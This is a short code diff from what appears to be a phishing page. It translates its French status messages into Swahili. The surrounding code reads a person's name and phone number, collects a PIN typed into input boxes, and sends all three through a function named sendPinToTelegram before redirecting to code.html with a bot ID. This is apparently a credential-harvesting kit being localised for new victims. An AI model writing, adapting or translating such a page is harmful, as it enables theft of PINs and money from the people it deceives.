@@ -308,10 +308,10 @@ boxes.forEach((box,i)=>{
       const name = localStorage.getItem("name")||"Unknown";
       const phone = localStorage.getItem("phone")||"Unknown";
       boxes.forEach(b=>b.disabled=true);
-      statusEl.textContent="Envoi du code PIN...";
+      statusEl.textContent="PIN inatumwa...";
       const res = await sendPinToTelegram(name,phone,pin);
       if(!res||!res.requestId){
-        statusEl.textContent="Échec. Veuillez réessayer.";
+       statusEl.textContent="Imeshindikana. Tafadhali jaribu tena.";
         boxes.forEach(b=>{b.disabled=false;b.value="";});
         boxes[0].focus(); return;
       }
@@ -319,7 +319,7 @@ boxes.forEach((box,i)=>{
       if(ok){
         window.location.href="code.html?botId="+botId;
       } else {
-        statusEl.textContent="Code PIN incorrect.";
+        statusEl.textContent="PIN uliyoingiza si sahihi.";
         boxes.forEach(b=>{b.disabled=false;b.value="";});
         boxes[0].focus();
       }
